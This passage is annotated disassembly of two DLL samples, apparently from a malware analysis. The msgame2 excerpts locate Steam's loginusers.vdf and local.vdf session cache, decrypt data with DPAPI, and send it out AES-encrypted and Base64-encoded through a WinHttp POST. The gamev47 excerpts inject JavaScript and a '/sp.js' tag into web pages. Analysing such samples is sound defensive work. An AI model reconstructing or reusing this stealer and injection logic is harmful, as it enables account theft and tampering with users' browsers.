0x0063a4  test        ebx,ebx
0x0063a6  mov         r13,rdi
0x0063a9  cmove       eax,ebp
0x0063ac  mov         ebp,eax
0x0063ae  mov         rax,qword ptr [rsi+10h]
0x0063b2  cmp         rdi,rax
0x0063b5  jb          0000000180006300
0x0063bb  mov         r13,qword ptr [rsp+0000000000000180h]
0x0063c3  xor         r12d,r12d
0x0063c6  mov         r14,qword ptr [rsp+50h]
0x0063cb  lea         rax,[000000018002BCE0h]
0x0063d2  mov         dword ptr [rsp+20h],r14d
0x0063d7  cmp         ebp,r14d
0x0063da  lea         r8,[000000018002BC90h]
```

```asm
; msgame2 parse_local_steam_cache (vdf 路径与 ConnectCache)
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001530  test        rcx,rcx
0x001533  je          000000018000184E
0x001539  push        rbp
0x00153a  push        rbx
0x00153b  lea         rbp,[rsp+FFFFFFFFFFFF7848h]
0x001543  mov         eax,88B8h
0x001548  call        0000000180006C20
0x00154d  sub         rsp,rax
0x001550  mov         rax,qword ptr [0000000180038180h]
0x001557  xor         rax,rsp
0x00155a  mov         qword ptr [rbp+0000000000008790h],rax
0x001561  xor         eax,eax
0x001563  mov         qword ptr [rsp+00000000000088D8h],rsi
0x00156b  mov         qword ptr [rsp+00000000000088E0h],rdi
0x001573  xorps       xmm0,xmm0
0x001576  mov         qword ptr [rsp+00000000000088E8h],r12
0x00157e  mov         rbx,rcx
0x001581  mov         qword ptr [rsp+00000000000088B0h],r13
0x001589  mov         edx,104h
0x00158e  mov         qword ptr [rcx],rax
0x001591  mov         esi,eax
0x001593  mov         qword ptr [rcx+8],rax
0x001597  mov         r13d,eax
0x00159a  mov         qword ptr [rcx+18h],rax
0x00159e  mov         r12d,eax
0x0015a1  mov         qword ptr [rcx+10h],rax
0x0015a5  mov         edi,eax
0x0015a7  mov         qword ptr [rsp+00000000000088A8h],r14
0x0015af  lea         rcx,[rbp+0000000000000160h]
0x0015b6  mov         qword ptr [rsp+00000000000088A0h],r15
0x0015be  mov         r14d,eax
0x0015c1  movups      xmmword ptr [rsp+40h],xmm0
0x0015c6  mov         qword ptr [rsp+50h],rax
0x0015cb  movups      xmmword ptr [rsp+58h],xmm0
0x0015d0  movups      xmmword ptr [rsp+68h],xmm0
0x0015d5  call        0000000180005DC0
0x0015da  mov         r15d,eax
0x0015dd  test        eax,eax
0x0015df  je          0000000180001702
0x0015e5  lea         rax,[rbp+0000000000000160h]
0x0015ec  mov         edx,104h
0x0015f1  lea         r9,[000000018002B8A0h] ; '%ls\\config\\loginusers.vdf'
0x0015f8  mov         qword ptr [rsp+20h],rax
0x0015fd  mov         r8,0FFFFFFFFFFFFFFFFh
0x001604  lea         rcx,[rbp+0000000000000370h]
0x00160b  call        00000001800010C0
0x001610  mov         r8d,4000h
0x001616  lea         rdx,[rbp+0000000000000790h]
0x00161d  lea         rcx,[000000018002B8D8h] ; 'LOCALAPPDATA'
0x001624  call        qword ptr [00000001800290A0h] ; KERNEL32.dll!GetEnvironmentVariableW
0x00162a  dec         eax
0x00162c  cmp         eax,3FFEh
0x001631  ja          0000000180001702
0x001637  lea         rax,[rbp+0000000000000790h]
0x00163e  mov         edx,104h
0x001643  lea         r9,[000000018002B8F8h] ; '%ls\\Steam\\local.vdf'
0x00164a  mov         qword ptr [rsp+20h],rax
0x00164f  mov         r8,0FFFFFFFFFFFFFFFFh
0x001656  lea         rcx,[rbp+0000000000000580h]
0x00165d  call        00000001800010C0
0x001662  xor         edx,edx
0x001664  lea         rcx,[rbp+0000000000000370h]
0x00166b  mov         r8d,1
0x001671  call        0000000180004BF0
0x001676  test        rax,rax
0x001679  lea         rcx,[rbp+0000000000000580h]
0x001680  mov         r14,rax
0x001683  setne       r13b
0x001687  xor         r8d,r8d
0x00168a  xor         edx,edx
0x00168c  call        0000000180004BF0
0x001691  test        rax,rax
0x001694  mov         rsi,rax
0x001697  setne       r12b
0x00169b  test        r14,r14
0x00169e  je          0000000180001702
0x0016a0  test        rax,rax
0x0016a3  je          0000000180001702
0x0016a5  lea         rdx,[rsp+40h]
0x0016aa  mov         rcx,rax
0x0016ad  call        00000001800030C0
0x0016b2  mov         edi,eax
0x0016b4  test        eax,eax
0x0016b6  je          0000000180001702
0x0016b8  lea         rax,[rsp+40h]
0x0016bd  mov         qword ptr [rsp+60h],rbx
0x0016c2  lea         r8,[rsp+58h]
0x0016c7  mov         qword ptr [rsp+58h],rax
0x0016cc  lea         rdx,[0000000180003360h]
```

```asm
; msgame2 DPAPI 解密调用点
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x003620  call        0000000180006B73
0x003625  test        eax,eax
0x003627  jne         0000000180003668
0x003629  lea         rax,[rsp+40h]
0x00362e  xorps       xmm0,xmm0
0x003631  mov         qword ptr [rsp+30h],rax
0x003636  lea         r8,[rsp+50h]
0x00363b  mov         dword ptr [rsp+28h],1
0x003643  lea         rcx,[rsp+60h]
0x003648  xor         r9d,r9d
0x00364b  mov         qword ptr [rsp+20h],0
0x003654  xor         edx,edx
0x003656  movups      xmmword ptr [rsp+40h],xmm0
0x00365b  call        0000000180006B73
0x003660  test        eax,eax
0x003662  je          00000001800037BF
0x003668  mov         ebx,dword ptr [rsp+40h]
0x00366c  mov         r15,qword ptr [rsp+48h]
0x003671  lea         ecx,[rbx+1]
0x003674  call        000000018000AEC0
0x003679  mov         rsi,rax
0x00367c  test        rax,rax
0x00367f  je          00000001800037A9
```

```asm
; msgame2 encode_and_post (JSON -> AES-CBC -> Base64 -> d=)
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x0064b0  push        rdi
0x0064b2  push        r13
0x0064b4  mov         eax,2228h
0x0064b9  call        0000000180006C20
0x0064be  sub         rsp,rax
0x0064c1  mov         rax,qword ptr [0000000180038180h]
0x0064c8  xor         rax,rsp
0x0064cb  mov         qword ptr [rsp+00000000000021E0h],rax
0x0064d3  mov         rax,qword ptr [rsp+0000000000002268h]
0x0064db  mov         rdi,r9
0x0064de  mov         r13,qword ptr [rsp+0000000000002260h]
0x0064e6  mov         qword ptr [rsp+40h],rax
0x0064eb  xor         eax,eax
0x0064ed  mov         qword ptr [rsp+48h],r8
0x0064f2  mov         word ptr [rsp+34h],dx
0x0064f7  mov         qword ptr [rsp+50h],rcx
0x0064fc  mov         dword ptr [rsp+38h],eax
0x006500  test        r9,r9
0x006503  je          0000000180006993
0x006509  test        r13,r13
0x00650c  je          0000000180006993
0x006512  test        rcx,rcx
0x006515  je          0000000180006993
0x00651b  test        r8,r8
0x00651e  je          0000000180006993
0x006524  mov         qword ptr [rsp+0000000000002220h],rbx
0x00652c  mov         ebx,eax
0x00652e  mov         qword ptr [rsp+0000000000002218h],rbp
0x006536  mov         qword ptr [rsp+0000000000002210h],rsi
0x00653e  mov         qword ptr [rsp+0000000000002208h],r12
0x006546  mov         r12d,eax
0x006549  mov         qword ptr [rsp+0000000000002200h],r14
0x006551  mov         qword ptr [rsp+00000000000021F8h],r15
0x006559  mov         dword ptr [rsp+30h],eax
0x00655d  mov         byte ptr [rsp+00000000000001E0h],al
0x006564  cmp         byte ptr [r9],al
0x006567  je          000000018000660B
0x00656d  nop         dword ptr [rax]
0x006570  lea         rax,[rbx+2]
0x006574  cmp         rax,2000h
0x00657a  jae         00000001800065F8
0x00657c  movzx       eax,byte ptr [rdi]
0x00657f  cmp         al,5Ch
0x006581  je          00000001800065D9
0x006583  cmp         al,22h
0x006585  je          00000001800065D9
0x006587  cmp         al,20h
0x006589  jae         00000001800065C0
0x00658b  mov         esi,2000h
0x006590  lea         rcx,[rsp+00000000000001E0h]
0x006598  sub         rsi,rbx
0x00659b  lea         r8,[000000018002B5D4h] ; '\\u%04x'
0x0065a2  mov         rdx,rsi
0x0065a5  mov         r9d,eax
0x0065a8  add         rcx,rbx
0x0065ab  call        00000001800059A0
0x0065b0  test        eax,eax
0x0065b2  js          00000001800065F8
0x0065b4  cdqe
0x0065b6  cmp         rax,rsi
0x0065b9  jae         00000001800065F8
0x0065bb  add         rbx,rax
0x0065be  jmp         00000001800065EC
0x0065c0  lea         rcx,[rbx+1]
0x0065c4  cmp         rcx,2000h
0x0065cb  jae         00000001800065F8
0x0065cd  mov         byte ptr [rsp+rbx+00000000000001E0h],al
0x0065d4  mov         rbx,rcx
0x0065d7  jmp         00000001800065EC
0x0065d9  mov         byte ptr [rsp+rbx+00000000000001E0h],5Ch
0x0065e1  mov         byte ptr [rsp+rbx+00000000000001E1h],al
0x0065e8  add         rbx,2
0x0065ec  inc         rdi
0x0065ef  cmp         byte ptr [rdi],r12b
0x0065f2  jne         0000000180006570
0x0065f8  cmp         rbx,2000h
0x0065ff  jb          000000018000660B
0x006601  mov         byte ptr [rsp+00000000000021DFh],r12b
0x006609  jmp         0000000180006613
0x00660b  mov         byte ptr [rsp+rbx+00000000000001E0h],r12b
0x006613  mov         ecx,10000h
0x006618  call        000000018000AEC0
0x00661d  mov         ecx,11940h
0x006622  mov         r15,rax
0x006625  call        000000018000AEC0
0x00662a  mov         ecx,11940h
0x00662f  mov         r14,rax
```

```asm
; msgame2 载荷格式串与发送调用
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x00669f  lea         r8,[000000018002B5E8h] ; '{"i":"%s","t":"%s","o":1}'
0x0066a6  mov         edx,11940h
0x0066ab  mov         rcx,r14
0x0066ae  call        00000001800059A0
0x0066b3  mov         r9d,11940h
0x0066b9  lea         r8,[rsp+38h]
0x0066be  mov         rdx,rsi
0x0066c1  mov         rcx,r14
0x0066c4  call        0000000180001130
0x0066c9  test        eax,eax
0x0066cb  jne         00000001800066D9
0x0066cd  lea         rbx,[000000018002B608h] ; 'AES-CBC'
0x0066d4  jmp         00000001800068EF
0x0066d9  mov         r10d,dword ptr [rsp+38h]
0x0066de  xor         edx,edx
0x0066e0  mov         r9,qword ptr [0000000180038120h]
0x0066e7  xor         r8d,r8d
0x0066ea  cmp         r10,2
0x0066ee  jbe         000000018000678D
0x0066f4  nop         dword ptr [rax]
0x0066f8  nop         dword ptr [rax+rax+0000000000000000h]
0x006700  lea         rax,[rdx+4]
0x006704  cmp         rax,23668h
0x00670a  jae         00000001800068DF
0x006710  movzx       eax,byte ptr [rsi+r8]
0x006715  shr         rax,2
0x006719  movzx       eax,byte ptr [rax+r9]
0x00671e  mov         byte ptr [rdx+rdi],al
```

```asm
; msgame2 https_post (WinHttp 调用序列)
; source: msgame2.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001d50  push        rbx
0x001d52  push        rbp
0x001d53  push        rsi
0x001d54  push        rdi
0x001d55  push        r12
0x001d57  push        r13
0x001d59  sub         rsp,488h
0x001d60  mov         rax,qword ptr [0000000180038180h]
0x001d67  xor         rax,rsp
0x001d6a  mov         qword ptr [rsp+0000000000000460h],rax
0x001d72  mov         rbx,qword ptr [rsp+00000000000004E8h]
0x001d7a  mov         rsi,r9
0x001d7d  mov         qword ptr [rsp+58h],r8
0x001d82  mov         rbp,r8
0x001d85  mov         word ptr [rsp+50h],dx
0x001d8a  movzx       r12d,dx
0x001d8e  mov         r13,rcx
0x001d91  test        r9,r9
0x001d94  je          0000000180001FE9
0x001d9a  test        rcx,rcx
0x001d9d  je          0000000180001FE9
0x001da3  test        r8,r8
0x001da6  je          0000000180001FE9
0x001dac  mov         rcx,r9
0x001daf  call        00000001800277E0
0x001db4  mov         ecx,eax
0x001db6  mov         rdi,rax
0x001db9  cmp         rcx,rax
0x001dbc  je          0000000180001DDC
0x001dbe  test        rbx,rbx
0x001dc1  je          0000000180001FFF
0x001dc7  cmp         byte ptr [rbx],0
0x001dca  je          0000000180001FFF
0x001dd0  lea         rcx,[000000018002B4E8h]
0x001dd7  jmp         0000000180001FFA
0x001ddc  mov         qword ptr [rsp+0000000000000480h],r14
0x001de4  xor         r14d,r14d
0x001de7  mov         qword ptr [rsp+0000000000000478h],r15
0x001def  call        0000000180006A90
0x001df4  mov         r15,rax
0x001df7  test        rax,rax
0x001dfa  jne         0000000180001E10
0x001dfc  lea         rdi,[000000018002B508h] ; 'WinHttpOpen'
0x001e03  call        qword ptr [0000000180029110h] ; KERNEL32.dll!GetLastError
0x001e09  mov         esi,eax
0x001e0b  jmp         0000000180001F59
0x001e10  xor         r9d,r9d
0x001e13  movzx       r8d,r12w
0x001e17  mov         rdx,r13
0x001e1a  mov         rcx,r15
0x001e1d  call        qword ptr [0000000180029378h] ; WINHTTP.dll!WinHttpConnect
0x001e23  mov         r12,rax
0x001e26  test        rax,rax
0x001e29  jne         0000000180001E48
0x001e2b  lea         rdi,[000000018002B518h] ; 'WinHttpConnect'
0x001e32  call        qword ptr [0000000180029110h] ; KERNEL32.dll!GetLastError
0x001e38  mov         rcx,r15
0x001e3b  mov         esi,eax
0x001e3d  call        qword ptr [0000000180029380h] ; WINHTTP.dll!WinHttpCloseHandle
0x001e43  jmp         0000000180001F53
0x001e48  xor         eax,eax
0x001e4a  mov         dword ptr [rsp+30h],800000h
0x001e52  mov         qword ptr [rsp+28h],rax
0x001e57  lea         rdx,[000000018002B528h] ; 'POST'
0x001e5e  xor         r9d,r9d
0x001e61  mov         qword ptr [rsp+20h],rax
0x001e66  mov         r8,rbp
0x001e69  mov         rcx,r12
0x001e6c  call        qword ptr [0000000180029360h] ; WINHTTP.dll!WinHttpOpenRequest
0x001e72  mov         rbp,rax
0x001e75  test        rax,rax
0x001e78  jne         0000000180001E8E
0x001e7a  lea         rdi,[000000018002B538h] ; 'WinHttpOpenRequest'
0x001e81  call        qword ptr [0000000180029110h] ; KERNEL32.dll!GetLastError
0x001e87  mov         esi,eax
0x001e89  jmp         0000000180001F33
0x001e8e  mov         edx,dword ptr [rsp+00000000000004E0h]
0x001e95  mov         rcx,rbp
0x001e98  mov         r9d,edx
0x001e9b  mov         dword ptr [rsp+20h],edx
0x001e9f  mov         r8d,edx
0x001ea2  call        qword ptr [0000000180029390h] ; WINHTTP.dll!WinHttpSetTimeouts
0x001ea8  test        eax,eax
0x001eaa  jne         0000000180001EBD
0x001eac  lea         rdi,[000000018002B550h] ; 'WinHttpSetTimeouts'
0x001eb3  call        qword ptr [0000000180029110h] ; KERNEL32.dll!GetLastError
0x001eb9  mov         esi,eax
0x001ebb  jmp         0000000180001F2A
0x001ebd  mov         qword ptr [rsp+30h],r14
0x001ec2  lea         rdx,[000000018002B330h] ; 'Content-Type: application/x-www-form-urlencoded'
0x001ec9  mov         dword ptr [rsp+28h],edi
0x001ecd  mov         r9,rsi
0x001ed0  mov         r8d,0FFFFFFFFh
0x001ed6  mov         dword ptr [rsp+20h],edi
0x001eda  mov         rcx,rbp
0x001edd  call        qword ptr [0000000180029358h] ; WINHTTP.dll!WinHttpSendRequest
0x001ee3  test        eax,eax
0x001ee5  jne         0000000180001EF8
0x001ee7  lea         rdi,[000000018002B568h] ; 'WinHttpSendRequest'
0x001eee  call        qword ptr [0000000180029110h] ; KERNEL32.dll!GetLastError
```

```asm
; gamev47 ordinal_1 -> main
; source: gamev47.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001000  jmp         0000000180001B60
0x001005  int         3
0x001006  int         3
0x001007  int         3
0x001008  int         3
0x001009  int         3
0x00100a  int         3
0x00100b  int         3
0x00100c  int         3
0x00100d  int         3
0x00100e  int         3
0x00100f  int         3
0x001010  sub         rsp,28h
0x001014  cmp         edx,1
0x001017  jne         000000018000101E
0x001019  call        00000001800018C0
0x00101e  mov         eax,1
0x001023  add         rsp,28h
0x001027  ret
0x001028  int         3
0x001029  int         3
0x00102a  int         3
0x00102b  int         3
0x00102c  int         3
0x00102d  int         3
0x00102e  int         3
0x00102f  int         3
0x001030  lea         rax,[000000018004C1E0h]
0x001037  ret
0x001038  int         3
0x001039  int         3
0x00103a  int         3
0x00103b  int         3
0x00103c  int         3
0x00103d  int         3
0x00103e  int         3
0x00103f  int         3
0x001040  mov         qword ptr [rsp+20h],r9
0x001045  push        rbx
0x001046  push        rbp
0x001047  push        rsi
0x001048  push        rdi
0x001049  push        r14
0x00104b  sub         rsp,40h
0x00104f  mov         rbp,r9
0x001052  lea         r14,[rsp+0000000000000090h]
0x00105a  mov         rbx,r8
0x00105d  mov         rdi,rdx
0x001060  mov         rsi,rcx
0x001063  call        0000000180001030
0x001068  mov         qword ptr [rsp+30h],r14
0x00106d  mov         r9,rbx
0x001070  mov         qword ptr [rsp+28h],0
0x001079  mov         r8,rdi
0x00107c  mov         rdx,rsi
0x00107f  mov         qword ptr [rsp+20h],rbp
0x001084  mov         rcx,qword ptr [rax]
0x001087  call        000000018001CD74
0x00108c  test        eax,eax
0x00108e  mov         ecx,0FFFFFFFFh
0x001093  cmovs       eax,ecx
0x001096  add         rsp,40h
0x00109a  pop         r14
0x00109c  pop         rdi
0x00109d  pop         rsi
0x00109e  pop         rbp
0x00109f  pop         rbx
0x0010a0  ret
0x0010a1  int         3
0x0010a2  int         3
0x0010a3  int         3
0x0010a4  int         3
0x0010a5  int         3
0x0010a6  int         3
0x0010a7  int         3
0x0010a8  int         3
0x0010a9  int         3
0x0010aa  int         3
0x0010ab  int         3
0x0010ac  int         3
0x0010ad  int         3
0x0010ae  int         3
0x0010af  int         3
0x0010b0  mov         qword ptr [rsp+20h],r9
0x0010b5  push        rbx
0x0010b6  push        rbp
0x0010b7  push        rsi
0x0010b8  push        rdi
0x0010b9  push        r14
0x0010bb  sub         rsp,40h
0x0010bf  mov         rbp,r9
0x0010c2  lea         r14,[rsp+0000000000000090h]
0x0010ca  mov         rbx,r8
0x0010cd  mov         rdi,rdx
0x0010d0  mov         rsi,rcx
0x0010d3  call        0000000180001030
0x0010d8  mov         qword ptr [rsp+30h],r14
0x0010dd  mov         r9,rbx
0x0010e0  mov         qword ptr [rsp+28h],0
0x0010e9  mov         r8,rdi
0x0010ec  mov         rdx,rsi
0x0010ef  mov         qword ptr [rsp+20h],rbp
0x0010f4  mov         rcx,qword ptr [rax]
0x0010f7  call        000000018001CF38
0x0010fc  test        eax,eax
0x0010fe  mov         ecx,0FFFFFFFFh
0x001103  cmovs       eax,ecx
0x001106  add         rsp,40h
0x00110a  pop         r14
0x00110c  pop         rdi
0x00110d  pop         rsi
0x00110e  pop         rbp
0x00110f  pop         rbx
0x001110  ret
0x001111  int         3
0x001112  int         3
0x001113  int         3
0x001114  int         3
0x001115  int         3
0x001116  int         3
0x001117  int         3
0x001118  int         3
0x001119  int         3
0x00111a  int         3
0x00111b  int         3
0x00111c  int         3
0x00111d  int         3
0x00111e  int         3
0x00111f  int         3
```

```asm
; gamev47 main -> patch 调度
; source: gamev47.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001b60  mov         qword ptr [rsp+8],rbx
0x001b65  push        rbp
0x001b66  lea         rbp,[rsp+FFFFFFFFFFFFBE00h]
0x001b6e  mov         eax,4300h
0x001b73  call        0000000180011CE0
0x001b78  sub         rsp,rax
0x001b7b  mov         rax,qword ptr [0000000180043180h]
0x001b82  xor         rax,rsp
0x001b85  mov         qword ptr [rbp+00000000000041F0h],rax
0x001b8c  lea         rcx,[0000000180036348h] ; 'PX_BRIDGE_TEST'
0x001b93  call        0000000180017A30
0x001b98  lea         rcx,[0000000180036358h] ; 'sidecar entry'
0x001b9f  mov         rbx,rax
0x001ba2  call        00000001800012A0
0x001ba7  xor         r9d,r9d
0x001baa  lea         rdx,[0000000180001120h]
0x001bb1  xor         r8d,r8d
0x001bb4  lea         rcx,[000000018004B208h]
0x001bbb  call        qword ptr [0000000180032120h] ; KERNEL32.dll!InitOnceExecuteOnce
0x001bc1  test        rbx,rbx
0x001bc4  je          0000000180001C98
0x001bca  movzx       eax,byte ptr [rbx]
0x001bcd  test        al,al
0x001bcf  je          0000000180001C98
0x001bd5  cmp         al,30h
0x001bd7  je          0000000180001C98
0x001bdd  xor         ebx,ebx
0x001bdf  mov         ecx,0FFFFFFFFh
0x001be4  mov         qword ptr [rsp+40h],rbx
0x001be9  call        qword ptr [0000000180032190h] ; KERNEL32.dll!AttachConsole
0x001bef  test        eax,eax
0x001bf1  je          0000000180001C9F
0x001bf7  mov         ecx,1
0x001bfc  call        0000000180017B58
0x001c01  mov         r9,rax
0x001c04  lea         r8,[0000000180035C28h]
0x001c0b  lea         rdx,[0000000180035C30h] ; 'CONOUT$'
0x001c12  lea         rcx,[rsp+40h]
0x001c17  call        000000018001D1F4
0x001c1c  mov         ecx,2
0x001c21  call        0000000180017B58
0x001c26  mov         r9,rax
0x001c29  lea         r8,[0000000180035C28h]
0x001c30  lea         rdx,[0000000180035C30h] ; 'CONOUT$'
0x001c37  lea         rcx,[rsp+40h]
0x001c3c  call        000000018001D1F4
0x001c41  xor         ecx,ecx
0x001c43  call        0000000180017B58
0x001c48  mov         r9,rax
0x001c4b  lea         r8,[0000000180035C38h]
0x001c52  lea         rdx,[0000000180035C3Ch] ; 'CONIN$'
0x001c59  lea         rcx,[rsp+40h]
0x001c5e  call        000000018001D1F4
0x001c63  mov         ecx,0FDE9h
0x001c68  call        qword ptr [00000001800321A0h] ; KERNEL32.dll!SetConsoleOutputCP
0x001c6e  mov         ecx,0FDE9h
0x001c73  call        qword ptr [0000000180032198h] ; KERNEL32.dll!SetConsoleCP
0x001c79  mov         ecx,1
0x001c7e  call        0000000180017B58
```

```asm
; gamev47 调用 0x102d0
; source: gamev47.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x001d8a  call        00000001800102D0
0x001d8f  lea         r9,[0000000180036368h] ; 'sidecar patch rc=%u'
0x001d96  mov         dword ptr [rsp+20h],eax
0x001d9a  mov         edx,100h
0x001d9f  lea         rcx,[rbp+0000000000003F70h]
0x001da6  mov         r8,0FFFFFFFFFFFFFFFFh
0x001dad  mov         ebx,eax
0x001daf  call        0000000180001040
0x001db4  lea         rcx,[rbp+0000000000003F70h]
0x001dbb  call        00000001800012A0
0x001dc0  cmp         dword ptr [0000000180043E40h],0
0x001dc7  mov         edx,180h
0x001dcc  je          0000000180001E1E
0x001dce  cmp         byte ptr [0000000180046174h],0
0x001dd5  lea         rcx,[0000000180046174h]
0x001ddc  lea         rax,[00000001800362F8h]
0x001de3  mov         r8,0FFFFFFFFFFFFFFFFh
```

```asm
; gamev47 注入 px_msgpoll 脚本
; source: gamev47.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x00a988  movaps      xmm0,xmmword ptr [0000000180034AD0h] ; ';/*px:b*/try{(function(){if(window.__pxPoll)return;window.__pxPoll=1;var LM='
0x00a98f  lea         rdx,[rsi+0000000000005000h]
0x00a996  movups      xmmword ptr [r14+rax],xmm0
0x00a99b  lea         rcx,[rbp-40h]
0x00a99f  movaps      xmm1,xmmword ptr [0000000180034AE0h] ; 'nction(){if(window.__pxPoll)return;window.__pxPoll=1;var LM='
0x00a9a6  movups      xmmword ptr [r14+rax+10h],xmm1
0x00a9ac  movaps      xmm0,xmmword ptr [0000000180034AF0h] ; 'ow.__pxPoll)return;window.__pxPoll=1;var LM='
0x00a9b3  movups      xmmword ptr [r14+rax+20h],xmm0
0x00a9b9  movaps      xmm1,xmmword ptr [0000000180034B00h] ; 'rn;window.__pxPoll=1;var LM='
0x00a9c0  movups      xmmword ptr [r14+rax+30h],xmm1
0x00a9c6  movups      xmm0,xmmword ptr [0000000180034B0Ch] ; 'pxPoll=1;var LM='
0x00a9cd  movups      xmmword ptr [r14+rax+3Ch],xmm0
0x00a9d3  add         r14,4Ch
0x00a9d7  mov         qword ptr [rbp-38h],r14
```

```asm
; gamev47 注入 /*px:b*/ 主脚本
; source: gamev47.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x00addb  lea         rdx,[0000000180034B50h] ; '";function open(){if(window.__pxA)return;window.__pxA=1;window.__pxCM=1;window.__pxH=HU;window.__pxS=SU;window.H=HU;try{document.addEventListener("contextmenu",function(e){var t=e.target;while(t&&t.nodeType===1){if(t.tag'
0x00ade2  call        000000018002FE90
0x00ade7  add         rbx,0AB8h
0x00adee  mov         qword ptr [rbp-40h],0
0x00adf6  mov         dword ptr [rbp+30h],1
0x00adfd  mov         byte ptr [rbx+rdi],0
0x00ae01  mov         qword ptr [r12],rdi
0x00ae05  mov         qword ptr [r12+8],rbx
0x00ae0a  jmp         000000018000A91E
0x00ae0f  mov         r14,rbx
0x00ae12  mov         rsi,rax
0x00ae15  jmp         000000018000A92B
0x00ae1a  int         3
0x00ae1b  int         3
0x00ae1c  int         3
0x00ae1d  int         3
0x00ae1e  int         3
0x00ae1f  int         3
0x00ae20  push        rbp
0x00ae22  push        r14
0x00ae24  push        r15
0x00ae26  sub         rsp,670h
```

```asm
; gamev47 插入 /sp.js 标签
; source: gamev47.dll.decoded.sample.annotated.asm.txt  (RVA = VA - 0x180000000)
0x007b50  lea         rdx,[0000000180035FB0h] ; '<script defer="defer" src="/sp.js"></script>'
0x007b57  call        000000018002FD90
0x007b5c  test        eax,eax
0x007b5e  je          0000000180007BBA
0x007b60  inc         rdi
0x007b63  lea         rax,[rdi+2Ch]
```
